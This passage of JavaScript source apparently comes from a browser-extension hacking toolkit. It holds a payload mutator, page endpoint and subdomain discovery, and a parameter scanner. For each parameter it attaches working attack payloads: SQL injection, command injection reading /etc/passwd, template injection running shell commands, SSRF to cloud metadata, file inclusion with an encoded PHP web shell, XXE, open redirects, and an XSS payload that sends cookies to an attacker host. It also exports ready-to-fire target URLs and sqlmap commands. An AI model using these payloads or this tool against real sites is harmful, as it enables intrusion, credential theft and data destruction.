    return str.split('').map(c => `&#x${c.charCodeAt(0).toString(16)};`).join('');
}

function htmlMixedEncode(str) {
    return str.split('').map((c, i) =>
        i % 3 === 0 ? `&#${c.charCodeAt(0)};` :
            i % 3 === 1 ? `&#x${c.charCodeAt(0).toString(16)};` : c
    ).join('');
}

function unicodeEncode(str) {
    return str.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
}

function utf7Encode(str) {
    // Simplified UTF-7 style encoding
    return '+ADw-script+AD4-' + str + '+ADw-/script+AD4-';
}

function utf16Encode(str) {
    return str.split('').map(c => `%u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
}

function hexEncode(str) {
    return str.split('').map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
}

function hexEncodeJs(str) {
    return str.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
}

function octalEncode(str) {
    return str.split('').map(c => '\\' + c.charCodeAt(0).toString(8).padStart(3, '0')).join('');
}

function randomCase(str) {
    return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
}

function alternateCase(str) {
    return str.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join('');
}

function invertCase(str) {
    return str.split('').map(c => c === c.toUpperCase() ? c.toLowerCase() : c.toUpperCase()).join('');
}

function capitalizeWords(str) {
    return str.replace(/\b\w/g, c => c.toUpperCase());
}

function renderMutations() {
    const output = document.getElementById('mutatorOutput');
    const count = document.getElementById('mutationCount');

    count.textContent = mutationResults.length;

    if (mutationResults.length === 0) {
        output.innerHTML = `
            <div class="mutator-empty">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                    <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4"/>
                </svg>
                <p>Masukkan payload dan klik MUTATE</p>
            </div>
        `;
        return;
    }

    output.innerHTML = mutationResults.map((m, i) => `
        <div class="mutation-item" onclick="copyMutation(${i})">
            <span class="mutation-index">${String(i + 1).padStart(2, '0')}</span>
            <span class="mutation-payload">${escapeHtml(m)}</span>
            <span class="mutation-copy">📋</span>
        </div>
    `).join('');
}

window.copyMutation = async function (index) {
    try {
        await navigator.clipboard.writeText(mutationResults[index]);
        showToast('Payload disalin!');
    } catch (err) {
        showToast('Gagal menyalin');
    }
};

async function copyAllMutations() {
    if (mutationResults.length === 0) {
        showToast('Belum ada mutasi');
        return;
    }
    try {
        await navigator.clipboard.writeText(mutationResults.join('\n'));
        showToast(`${mutationResults.length} payload disalin!`);
    } catch (err) {
        showToast('Gagal menyalin');
    }
}

function clearMutator() {
    document.getElementById('mutatorInput').value = '';
    mutationResults = [];
    renderMutations();
    showToast('Dibersihkan');
}

// ===== ENDPOINT DISCOVERER LOGIC =====
let discoveredEndpoints = { apis: [], paths: [], jsFiles: [] };

function setupEndpointEvents() {
    document.getElementById('backFromEndpoint')?.addEventListener('click', () => showScreen('tools'));
    document.getElementById('scanEndpointsBtn')?.addEventListener('click', scanEndpoints);
    document.getElementById('exportEndpointsBtn')?.addEventListener('click', exportEndpoints);
}

async function scanEndpoints() {
    const urlBox = document.getElementById('endpointTargetUrl');
    const statsDiv = document.getElementById('endpointStats');
    const resultsDiv = document.getElementById('endpointResults');

    resultsDiv.innerHTML = '<div class="endpoint-empty"><p>Scanning...</p></div>';

    try {
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        urlBox.textContent = tab.url;

        // Inject script to extract endpoints
        const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: extractEndpointsFromPage
        });

        if (results && results[0] && results[0].result) {
            discoveredEndpoints = results[0].result;

            // Update stats
            statsDiv.classList.remove('hidden');
            document.getElementById('statApiCount').textContent = discoveredEndpoints.apis.length;
            document.getElementById('statPathCount').textContent = discoveredEndpoints.paths.length;
            document.getElementById('statJsCount').textContent = discoveredEndpoints.jsFiles.length;

            renderEndpointResults();

            // Save to persistent storage
            chrome.runtime.sendMessage({
                type: 'saveDiscoveredData',
                data: { endpoints: discoveredEndpoints, subdomains: discoveredSubdomains }
            });

            showToast(`Found ${discoveredEndpoints.apis.length + discoveredEndpoints.paths.length} endpoints!`);
        }
    } catch (e) {
        console.error('Endpoint scan failed:', e);
        resultsDiv.innerHTML = '<div class="endpoint-empty"><p>Scan failed. Try refreshing the page.</p></div>';
    }
}

function extractEndpointsFromPage() {
    const endpoints = { apis: new Set(), paths: new Set(), jsFiles: [] };

    // Extract from script sources
    document.querySelectorAll('script[src]').forEach(s => {
        const src = s.getAttribute('src');
        if (src) {
            try {
                const url = new URL(src, window.location.href);
                if (url.pathname.endsWith('.js')) {
                    endpoints.jsFiles.push(url.href);
                }
            } catch (e) { }
        }
    });

    // Patterns to find in HTML and inline scripts
    const patterns = [
        // API endpoints
        /["'](\/api\/[^"']+)["']/g,
        /["'](\/v[0-9]+\/[^"']+)["']/g,
        /["'](\/graphql[^"']*)["']/g,
        /["'](\/rest\/[^"']+)["']/g,
        /["'](\/ajax\/[^"']+)["']/g,
        // Admin/internal paths
        /["'](\/admin[^"']*)["']/g,
        /["'](\/internal[^"']*)["']/g,
        /["'](\/debug[^"']*)["']/g,
        /["'](\/config[^"']*)["']/g,
        /["'](\/settings[^"']*)["']/g,
        // Fetch/XHR patterns
        /fetch\s*\(\s*["']([^"']+)["']/g,
        /\.get\s*\(\s*["']([^"']+)["']/g,
        /\.post\s*\(\s*["']([^"']+)["']/g,
        /\.put\s*\(\s*["']([^"']+)["']/g,
        /\.delete\s*\(\s*["']([^"']+)["']/g,
        /axios\s*\.\s*\w+\s*\(\s*["']([^"']+)["']/g,
        /XMLHttpRequest.*open\s*\(\s*["']\w+["']\s*,\s*["']([^"']+)["']/g,
        // URL constructors
        /new\s+URL\s*\(\s*["']([^"']+)["']/g,
        // Common paths
        /["'](\/users?[^"']*)["']/gi,
        /["'](\/auth[^"']*)["']/gi,
        /["'](\/login[^"']*)["']/gi,
        /["'](\/logout[^"']*)["']/gi,
        /["'](\/register[^"']*)["']/gi,
        /["'](\/upload[^"']*)["']/gi,
        /["'](\/download[^"']*)["']/gi,
        /["'](\/search[^"']*)["']/gi,
        /["'](\/export[^"']*)["']/gi,
        /["'](\/import[^"']*)["']/gi,
    ];

    // Get HTML content
    const htmlContent = document.documentElement.outerHTML;

    // Get inline scripts
    let inlineScripts = '';
    document.querySelectorAll('script:not([src])').forEach(s => {
        inlineScripts += s.textContent + '\n';
    });

    const fullContent = htmlContent + inlineScripts;

    // Extract endpoints using patterns
    patterns.forEach(pattern => {
        let match;
        while ((match = pattern.exec(fullContent)) !== null) {
            const endpoint = match[1];
            if (endpoint && endpoint.length > 1 && !endpoint.includes('{{') && !endpoint.includes('${')) {
                if (endpoint.startsWith('/api') || endpoint.includes('/v1/') || endpoint.includes('/v2/')) {
                    endpoints.apis.add(endpoint);
                } else if (endpoint.startsWith('/') || endpoint.startsWith('http')) {
                    endpoints.paths.add(endpoint);
                }
            }
        }
    });

    // Look for full URLs
    const urlPattern = /https?:\/\/[^\s"'<>]+/g;
    let match;
    while ((match = urlPattern.exec(fullContent)) !== null) {
        try {
            const url = new URL(match[0]);
            if (url.hostname !== window.location.hostname) {
                endpoints.apis.add(match[0]);
            }
        } catch (e) { }
    }

    return {
        apis: Array.from(endpoints.apis).slice(0, 50),
        paths: Array.from(endpoints.paths).slice(0, 50),
        jsFiles: endpoints.jsFiles.slice(0, 20)
    };
}

function renderEndpointResults() {
    const resultsDiv = document.getElementById('endpointResults');
    const { apis, paths, jsFiles } = discoveredEndpoints;

    if (apis.length === 0 && paths.length === 0 && jsFiles.length === 0) {
        resultsDiv.innerHTML = `
            <div class="endpoint-empty">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>
                </svg>
                <p>No hidden endpoints found</p>
            </div>
        `;
        return;
    }

    let html = '';

    if (apis.length > 0) {
        html += `
            <div class="endpoint-category">
                <div class="endpoint-category-header">
                    <span class="endpoint-category-title">APIs</span>
                    <span class="endpoint-category-count">${apis.length}</span>
                </div>
                ${apis.map((ep, i) => `
                    <div class="endpoint-item" onclick="copyEndpoint('api', ${i})">
                        <span class="endpoint-method api">API</span>
                        <span class="endpoint-url">${escapeHtml(ep)}</span>
                        <span class="endpoint-copy">📋</span>
                    </div>
                `).join('')}
            </div>
        `;
    }

    if (paths.length > 0) {
        html += `
            <div class="endpoint-category">
                <div class="endpoint-category-header">
                    <span class="endpoint-category-title">Paths</span>
                    <span class="endpoint-category-count">${paths.length}</span>
                </div>
                ${paths.map((ep, i) => `
                    <div class="endpoint-item" onclick="copyEndpoint('path', ${i})">
                        <span class="endpoint-method path">PATH</span>
                        <span class="endpoint-url">${escapeHtml(ep)}</span>
                        <span class="endpoint-copy">📋</span>
                    </div>
                `).join('')}
            </div>
        `;
    }

    if (jsFiles.length > 0) {
        html += `
            <div class="endpoint-category">
                <div class="endpoint-category-header">
                    <span class="endpoint-category-title">JS Files</span>
                    <span class="endpoint-category-count">${jsFiles.length}</span>
                </div>
                ${jsFiles.map((ep, i) => `
                    <div class="endpoint-item" onclick="copyEndpoint('js', ${i})">
                        <span class="endpoint-method get">JS</span>
                        <span class="endpoint-url">${escapeHtml(ep)}</span>
                        <span class="endpoint-copy">📋</span>
                    </div>
                `).join('')}
            </div>
        `;
    }

    resultsDiv.innerHTML = html;
}

window.copyEndpoint = async function (type, index) {
    let endpoint;
    if (type === 'api') endpoint = discoveredEndpoints.apis[index];
    else if (type === 'path') endpoint = discoveredEndpoints.paths[index];
    else endpoint = discoveredEndpoints.jsFiles[index];

    try {
        await navigator.clipboard.writeText(endpoint);
        showToast('Endpoint disalin!');
    } catch (e) {
        showToast('Gagal menyalin');
    }
};

function exportEndpoints() {
    const { apis, paths, jsFiles } = discoveredEndpoints;
    const all = [...apis, ...paths];
    if (all.length === 0) {
        showToast('Belum ada endpoints');
        return;
    }

    const text = `# Discovered Endpoints\n\n## APIs (${apis.length})\n${apis.join('\n')}\n\n## Paths (${paths.length})\n${paths.join('\n')}\n\n## JS Files (${jsFiles.length})\n${jsFiles.join('\n')}`;

    navigator.clipboard.writeText(text);
    showToast(`${all.length} endpoints exported!`);
}

// ===== SUBDOMAIN FINDER LOGIC =====
let discoveredSubdomains = [];

function setupSubdomainEvents() {
    document.getElementById('backFromSubdomain')?.addEventListener('click', () => showScreen('tools'));
    document.getElementById('findSubdomainsBtn')?.addEventListener('click', findSubdomains);
}

async function findSubdomains() {
    const input = document.getElementById('subdomainInput').value.trim();
    const resultsDiv = document.getElementById('subdomainResults');

    if (!input) {
        showToast('Masukkan domain terlebih dahulu');
        return;
    }

    // Clean domain
    let domain = input.replace(/^https?:\/\//, '').replace(/\/.*$/, '').toLowerCase();

    resultsDiv.innerHTML = '<div class="endpoint-empty"><p>Searching subdomains via crt.sh...</p></div>';

    try {
        // Use crt.sh API (certificate transparency logs)
        const response = await fetch(`https://crt.sh/?q=%.${domain}&output=json`);

        if (!response.ok) {
            throw new Error('crt.sh API failed');
        }

        const data = await response.json();

        // Extract unique subdomains
        const subdomains = new Set();
        data.forEach(entry => {
            const name = entry.name_value;
            if (name) {
                name.split('\n').forEach(n => {
                    const clean = n.trim().toLowerCase();
                    if (clean.endsWith(domain) && !clean.startsWith('*')) {
                        subdomains.add(clean);
                    }
                });
            }
        });

        discoveredSubdomains = Array.from(subdomains).sort();
        renderSubdomainResults();

        // Save to persistent storage
        chrome.runtime.sendMessage({
            type: 'saveDiscoveredData',
            data: { endpoints: discoveredEndpoints, subdomains: discoveredSubdomains }
        });

        showToast(`Found ${discoveredSubdomains.length} subdomains!`);

    } catch (e) {
        console.error('Subdomain search failed:', e);
        resultsDiv.innerHTML = '<div class="endpoint-empty"><p>Search failed. Try again later.</p></div>';
    }
}

function renderSubdomainResults() {
    const resultsDiv = document.getElementById('subdomainResults');

    if (discoveredSubdomains.length === 0) {
        resultsDiv.innerHTML = `
            <div class="endpoint-empty">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                    <circle cx="12" cy="12" r="10"/><path d="M2 12h20"/>
                </svg>
                <p>No subdomains found</p>
            </div>
        `;
        return;
    }

    resultsDiv.innerHTML = `
        <div class="endpoint-category">
            <div class="endpoint-category-header">
                <span class="endpoint-category-title">Subdomains</span>
                <span class="endpoint-category-count">${discoveredSubdomains.length}</span>
            </div>
            ${discoveredSubdomains.map((sub, i) => `
                <div class="endpoint-item" onclick="copySubdomain(${i})">
                    <span class="endpoint-method api">SUB</span>
                    <span class="endpoint-url">${escapeHtml(sub)}</span>
                    <span class="endpoint-copy">📋</span>
                </div>
            `).join('')}
        </div>
    `;
}

window.copySubdomain = async function (index) {
    try {
        await navigator.clipboard.writeText(discoveredSubdomains[index]);
        showToast('Subdomain disalin!');
    } catch (e) {
        showToast('Gagal menyalin');
    }
};

// ===== AUTO PARAMETER SCANNER LOGIC =====
let discoveredParameters = [];

function setupParameterEvents() {
    document.getElementById('backFromParameter')?.addEventListener('click', () => showScreen('tools'));
    document.getElementById('scanParamsBtn')?.addEventListener('click', scanParameters);
    document.getElementById('sendParamsBtn')?.addEventListener('click', sendParametersToArsenal);
    document.getElementById('exportParamsBtn')?.addEventListener('click', exportParametersTXT);
}

// Export parameters to TXT file with READY-TO-TEST URLs
async function exportParametersTXT() {
    if (discoveredParameters.length === 0) {
        showToast('No parameters to export. Scan first.');
        return;
    }

    // Get current page URL as base
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    const baseUrl = tab?.url ? new URL(tab.url).origin : 'https://target.com';

    // Test payloads for each vuln type
    const payloads = {
        sqli: ["'", "1' OR '1'='1", "1 UNION SELECT NULL--", "1; DROP TABLE users--", "admin'--"],
        xss: ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "javascript:alert(1)", "'onmouseover='alert(1)"],
        lfi: ["../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index.php"],
        ssrf: ["http://127.0.0.1", "http://localhost:80", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"],
        redirect: ["//evil.com", "https://evil.com", "//google.com", "/\\evil.com"]
    };

    // Build content
    let content = `# ========================================\n`;
    content += `# LUHUT BINSHAR - READY TO TEST URLs\n`;
    content += `# ========================================\n`;
    content += `# Base URL: ${baseUrl}\n`;
    content += `# Generated: ${new Date().toISOString()}\n`;
    content += `# Total Params: ${discoveredParameters.length}\n\n`;

    // Group by vuln type
    const grouped = { sqli: [], xss: [], lfi: [], ssrf: [], redirect: [], other: [] };
    discoveredParameters.forEach(p => {
        const type = p.vulnType || 'other';
        if (grouped[type]) grouped[type].push(p);
        else grouped.other.push(p);
    });

    // Generate test URLs for each type
    Object.entries(grouped).forEach(([type, params]) => {
        if (params.length === 0) return;

        content += `\n# ========================================\n`;
        content += `# ${type.toUpperCase()} TEST URLs (${params.length} params)\n`;
        content += `# ========================================\n\n`;

        const typePayloads = payloads[type] || ["FUZZ"];

        params.forEach(p => {
            content += `# Parameter: ${p.name}\n`;
            typePayloads.forEach(payload => {
                const encodedPayload = encodeURIComponent(payload);
                content += `${baseUrl}/?${p.name}=${encodedPayload}\n`;
            });
            content += `\n`;
        });
    });

    // FFuf/SQLMap format
    content += `\n# ========================================\n`;
    content += `# FFUF FORMAT (replace FUZZ)\n`;
    content += `# ========================================\n`;
    content += `# ffuf -u "${baseUrl}/?PARAM=FUZZ" -w payloads.txt\n\n`;
    discoveredParameters.forEach(p => {
        content += `${baseUrl}/?${p.name}=FUZZ\n`;
    });

    // SQLMap format
    content += `\n# ========================================\n`;
    content += `# SQLMAP COMMANDS\n`;
    content += `# ========================================\n`;
    grouped.sqli.forEach(p => {
        content += `sqlmap -u "${baseUrl}/?${p.name}=1" --batch --dbs\n`;
    });

    // XSStrike format
    content += `\n# ========================================\n`;
    content += `# XSSTRIKE COMMANDS\n`;
    content += `# ========================================\n`;
    grouped.xss.forEach(p => {
        content += `xsstrike -u "${baseUrl}/?${p.name}=test"\n`;
    });

    // Param names only (for custom wordlists)
    content += `\n# ========================================\n`;
    content += `# PARAMETER NAMES ONLY\n`;
    content += `# ========================================\n`;
    discoveredParameters.forEach(p => {
        content += `${p.name}\n`;
    });

    // Download
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `test_urls_${new Date().getTime()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);

    showToast(`🔥 Exported ${discoveredParameters.length} params with TEST URLs!`);
}

async function scanParameters() {
    showToast('🔥 Aggressive Parameter Scan Starting...');

    try {
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (!tab?.url) {
            showToast('No active tab');
            return;
        }

        const url = new URL(tab.url);
        const domain = url.hostname;
        const paramMap = new Map();

        // 1. Try Wayback Machine
        showToast(`[1/3] Fetching Wayback URLs for ${domain}...`);
        try {
            const waybackResponse = await chrome.runtime.sendMessage({
                type: 'fetchWayback',
                domain: domain
            });

            if (waybackResponse?.success && Array.isArray(waybackResponse.data) && waybackResponse.data.length > 1) {
                waybackResponse.data.slice(1).forEach(row => {
                    try {
                        const urlStr = row[0];
                        if (!urlStr || !urlStr.includes('?')) return;

                        const parsed = new URL(urlStr);
                        new URLSearchParams(parsed.search).forEach((value, name) => {
                            if (!paramMap.has(name)) {
                                paramMap.set(name, {
                                    name,
                                    value: value.substring(0, 50),
                                    type: 'wayback',
                                    vulnType: analyzeParamVulnType(name),
                                    source: parsed.pathname,
                                    count: 1
                                });
                            } else {
                                paramMap.get(name).count++;
                            }
                        });
                    } catch (e) { }
                });
                showToast(`Found ${paramMap.size} params from Wayback`);
            }
        } catch (e) {
            console.warn('Wayback failed, continuing...', e);
        }

        // 2. Aggressive DOM Scraping
        showToast('[2/3] Aggressive DOM scraping...');
        const domResults = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
                const params = [];

                // Current URL params
                new URLSearchParams(window.location.search).forEach((v, n) => {
                    params.push({ name: n, value: v, type: 'url-query' });
                });

                // All forms and inputs
                document.querySelectorAll('input, textarea, select').forEach(el => {
                    const name = el.name || el.id || el.getAttribute('data-name');
                    if (name) {
                        params.push({
                            name,
                            value: el.value || '',
                            type: el.type === 'hidden' ? 'hidden' : 'form-input'
                        });
                    }
                });

                // Data attributes
                document.querySelectorAll('[data-id], [data-param], [data-value], [data-token], [data-user]').forEach(el => {
                    Object.entries(el.dataset).forEach(([k, v]) => {
                        params.push({ name: `data-${k}`, value: v, type: 'data-attr' });
                    });
                });

                // Links with params
                document.querySelectorAll('a[href*="?"]').forEach(a => {
                    try {
                        const href = new URL(a.href, window.location.origin);
                        new URLSearchParams(href.search).forEach((v, n) => {
                            params.push({ name: n, value: v, type: 'link-param' });
                        });
                    } catch (e) { }
                });

                // JavaScript variables (aggressive)
                const scripts = document.querySelectorAll('script:not([src])');
                const jsParamRegex = /['"]([a-zA-Z_][a-zA-Z0-9_]*)['"]\s*[:=]\s*['"]([^'"]*)['"]/g;
                scripts.forEach(script => {
                    let match;
                    while ((match = jsParamRegex.exec(script.textContent)) !== null) {
                        if (match[1].length > 2 && match[1].length < 30) {
                            params.push({ name: match[1], value: match[2], type: 'js-var' });
                        }
                    }
                });

                // onclick handlers
                document.querySelectorAll('[onclick]').forEach(el => {
                    const onclick = el.getAttribute('onclick');
                    const onclickMatch = onclick.match(/['"]([a-zA-Z_]+)['"]\s*[,:]\s*['"]([^'"]*)['"]/g);
                    if (onclickMatch) {
                        onclickMatch.forEach(m => {
                            const parts = m.match(/['"]([^'"]+)['"]/g);
                            if (parts && parts[0]) {
                                params.push({ name: parts[0].replace(/['"]/g, ''), value: parts[1]?.replace(/['"]/g, '') || '', type: 'onclick' });
                            }
                        });
                    }
                });

                return params;
            }
        });

        // 3. Merge DOM results
        showToast('[3/3] Analyzing parameters...');
        if (domResults?.[0]?.result) {
            domResults[0].result.forEach(p => {
                if (!paramMap.has(p.name)) {
                    p.vulnType = analyzeParamVulnType(p.name);
                    p.count = 1;
                    paramMap.set(p.name, p);
                } else {
                    paramMap.get(p.name).count++;
                }
            });
        }

        discoveredParameters = Array.from(paramMap.values());
        renderParameterList();
        updateParameterStats();

        chrome.runtime.sendMessage({
            type: 'saveDiscoveredData',
            data: { parameters: discoveredParameters }
        });

        showToast(`🎯 Found ${discoveredParameters.length} unique parameters!`);

    } catch (e) {
        console.error('Aggressive scan failed:', e);
        showToast('Scan failed: ' + e.message);
    }
}

// Analyze param for vulnerability potential - Advanced payloads from exploit-db/PayloadsAllTheThings
function analyzeParamVulnType(name) {
    const n = name.toLowerCase();

    // SQLi - ID parameters (Advanced: Time-based blind + Error-based)
    if (['id', 'user_id', 'uid', 'product_id', 'item_id', 'order_id', 'cat_id',
        'category_id', 'article_id', 'post_id', 'comment_id', 'pid', 'sid'].some(k => n === k || n.endsWith('_id'))) {
        return {
            type: 'sqli',
            desc: 'Potential SQLi (ID parameter)',
            payloads: [
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
                "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
                "1'/**/AND/**/1=1/**/--/**/",
                "1' AND 1=1 ORDER BY 1-- -"
            ]
        };
    }

    // SQLi - Query/Search parameters
    if (['query', 'search', 'q', 'keyword', 'term', 'filter', 'order', 'sort',
        'orderby', 'sortby', 'limit', 'offset', 'column', 'table', 'field'].some(k => n.includes(k))) {
        return {
            type: 'sqli',
            desc: 'Potential SQLi (query parameter)',
            payloads: [
                "' UNION SELECT NULL,NULL,NULL,version()-- -",
                "' UNION ALL SELECT 1,2,3,CONCAT(user(),0x3a,database())-- -",
                "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
                "'||(SELECT 1 FROM dual WHERE 1=1)||'",
                "') OR ('1'='1'-- -"
            ]
        };
    }

    // RCE - Command parameters
    if (['cmd', 'exec', 'command', 'execute', 'ping', 'jump', 'code',
        'reg', 'do', 'func', 'arg', 'option', 'load', 'process', 'step',
        'feature', 'exe', 'module', 'run', 'shell', 'env'].some(k => n.includes(k))) {
        return {
            type: 'rce',
            desc: 'Potential RCE (command parameter)',
            payloads: [
                ";$(whoami)",
                "|cat /etc/passwd",
                "`id`",
                "$((1+1))",
                "||ping -c 5 127.0.0.1||",
                "%0a id %0a",
                "& nslookup burpcollaborator.net &"
            ]
        };
    }

    // SSTI - Template parameters
    if (['template', 'tpl', 'render', 'view', 'layout', 'theme', 'preview',
        'design', 'skin'].some(k => n.includes(k))) {
        return {
            type: 'ssti',
            desc: 'Potential SSTI (template parameter)',
            payloads: [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "#{7*7}",
                "${{<%[%'\"}}%\\."
            ]
        };
    }

    // XSS - Text/Name parameters
    if (['name', 'username', 'email', 'msg', 'message', 'text', 'title',
        'body', 'description', 'comment', 'feedback', 'review',
        'callback', 'jsonp', 'cb', 'handler', 'success', 'error'].some(k => n.includes(k))) {
        return {
            type: 'xss',
            desc: 'Potential XSS (input parameter)',
            payloads: [
                "\"><img src=x onerror=alert(1)>",
                "'-alert(1)-'",
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                "<svg/onload=alert(String.fromCharCode(88,83,83))>",
                "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
                "\"onmouseover=\"alert(1)\"style=\"position:fixed;width:100%;height:100%;top:0;left:0;",
                "<script>fetch('https://attacker/?c='+document.cookie)</script>"
            ]
        };
    }

    // SSRF - URL parameters
    if (['url', 'uri', 'link', 'src', 'source', 'dest', 'destination', 'target',
        'rurl', 'redirect_uri', 'return_url', 'proxy', 'host', 'site', 'html',
        'domain', 'reference', 'ref', 'api', 'endpoint'].some(k => n.includes(k))) {
        return {
            type: 'ssrf',
            desc: 'Potential SSRF (URL parameter)',
            payloads: [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "file:///etc/passwd",
                "gopher://localhost:6379/_INFO",
                "dict://localhost:11211/stats",
                "http://[::]:80/",
                "http://0177.0.0.1/"
            ]
        };
    }

    // LFI - File parameters (Advanced with wrappers)
    if (['file', 'filename', 'path', 'filepath', 'dir', 'directory', 'folder',
        'doc', 'document', 'include', 'inc', 'locate', 'show', 'display',
        'page', 'download', 'read', 'root', 'conf', 'config'].some(k => n.includes(k))) {
        return {
            type: 'lfi',
            desc: 'Potential LFI (file parameter)',
            payloads: [
                "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
                "/proc/self/environ",
                "expect://id",
                "..\\..\\..\\..\\..\\windows\\win.ini"
            ]
        };
    }

    // Open Redirect
    if (['redirect', 'return', 'next', 'goto', 'redir', 'out', 'continue',
        'return_to', 'returnto', 'forward', 'logout'].some(k => n.includes(k))) {
        return {
            type: 'redirect',
            desc: 'Potential Open Redirect',
            payloads: [
                "//evil.com",
                "/\\evil.com",
                "https:evil.com",
                "//evil.com/%2f%2e%2e",
                "////evil.com",
                "https://evil.com@trusted.com"
            ]
        };
    }

    // XXE
    if (['xml', 'xmldata', 'soap', 'wsdl', 'dtd', 'schema'].some(k => n.includes(k))) {
        return {
            type: 'xxe',
            desc: 'Potential XXE',
            payloads: [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker/xxe">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
            ]
        };
    }

    return { type: 'param', desc: 'Discovered parameter', payloads: ['test', 'FUZZ', '{{7*7}}', '<>"\'/'] };
}

function updateParameterStats() {
    const criticalCount = discoveredParameters.filter(p => p.vulnType?.risk === 'critical').length;
    const highCount = discoveredParameters.filter(p => p.vulnType?.risk === 'high').length;
    const mediumCount = discoveredParameters.filter(p => p.vulnType?.risk === 'medium' || p.vulnType?.risk === 'low').length;

    document.getElementById('statQueryCount').textContent = criticalCount;
    document.getElementById('statFormCount').textContent = highCount;
    document.getElementById('statHiddenCount').textContent = mediumCount;
}

function renderParameterList() {
    const listDiv = document.getElementById('parameterList');

    if (discoveredParameters.length === 0) {
        listDiv.innerHTML = `
            <div class="endpoint-empty">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                    <path d="M4 7V4h16v3"/>
                    <path d="M9 20h6"/>
                    <path d="M12 4v16"/>
                </svg>
                <p>Klik tombol scan untuk menemukan parameter</p>
            </div>
        `;
        return;
    }

    listDiv.innerHTML = discoveredParameters.map((param, i) => {
        const vuln = param.vulnType || { type: 'param', desc: 'Discovered parameter', payloads: ['test'] };
        const vulnType = vuln.type || 'param';
        const payloads = vuln.payloads || [vuln.payload || 'test'];
        const countText = param.count > 1 ? ` (${param.count}x)` : '';

        // Build full target URL example
        const baseUrl = param.source || param.type || 'page';
        const targetExample = `?${param.name}=PAYLOAD`;

        return `
            <div class="param-simple">
                <div class="param-simple-header">
                    <span class="param-simple-name">${escapeHtml(param.name)}${countText}</span>
                    <span class="param-simple-type">${vulnType.toUpperCase()}</span>
                </div>
                
                <div class="param-simple-info">
                    <div class="param-simple-row">
                        <span class="label">Type:</span>
                        <span class="value">${escapeHtml(vuln.desc)}</span>
                    </div>
                    <div class="param-simple-row">
                        <span class="label">Found:</span>
                        <span class="value">${escapeHtml(baseUrl)}</span>
                    </div>
                    <div class="param-simple-row">
                        <span class="label">Value:</span>
                        <code class="value-code">${escapeHtml(param.value?.substring(0, 30) || 'empty')}</code>
                    </div>
                    <div class="param-simple-row">
                        <span class="label">Target:</span>
                        <code class="target-code">${escapeHtml(targetExample)}</code>
                    </div>
                </div>
                
                <div class="param-payloads">
                    <div class="payloads-label">Test Payloads (${payloads.length}):</div>
                    <div class="param-payloads-list">
                        ${payloads.map((p, pi) => `
                            <div class="param-payload-item" onclick="copySpecificPayload(${i}, ${pi}); event.stopPropagation();">
                                <code>${escapeHtml(p.substring(0, 60))}${p.length > 60 ? '...' : ''}</code>
                            </div>
                        `).join('')}
                    </div>
                </div>
                
                <div class="param-simple-actions">
                    <button onclick="copyParameter(${i})">Copy Name=Value</button>
                    <button onclick="copyAllPayloads(${i})">Copy All Payloads</button>
                </div>
            </div>
        `;
    }).join('');
}

// Copy parameter name=value
window.copyParameter = function (index) {
    const param = discoveredParameters[index];
    if (param) {
        navigator.clipboard.writeText(`${param.name}=${param.value || ''}`);
        showToast('Copied: ' + param.name);
    }
};

// Copy specific payload
window.copySpecificPayload = function (paramIndex, payloadIndex) {
    const param = discoveredParameters[paramIndex];
    if (param) {
        const payloads = param.vulnType?.payloads || [param.vulnType?.payload || 'test'];
        const payload = payloads[payloadIndex] || payloads[0];
